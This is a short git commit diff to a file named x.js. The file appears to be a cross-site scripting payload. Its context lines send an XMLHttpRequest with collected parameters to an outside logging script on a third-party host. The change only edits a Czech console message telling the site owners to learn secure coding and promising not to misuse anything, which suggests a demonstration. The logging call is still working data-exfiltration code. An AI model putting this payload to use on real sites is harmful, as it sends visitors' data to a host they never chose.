c0bb4bf549dea206ba52f568acc067c21da1629b
Testerino <honzaik@yahoo.com>
2014-04-17 00:25:07 +0200

    Update x.js

--- x.js
+++ x.js
@@ -5,4 +5,4 @@ var xhr = new XMLHttpRequest();
 
 xhr.open('GET', 'http://pleasefixxss.net63.net/log.php' + params, true);
 xhr.send(null);
-console.log("DOBRÝ DEN, prosím vás naučte se vytvářet bezpeční software. děkuji");
+console.log("DOBRÝ DEN, prosím vás naučte se vytvářet bezpečný software. děkuji. nebojte nic nezneužiji");
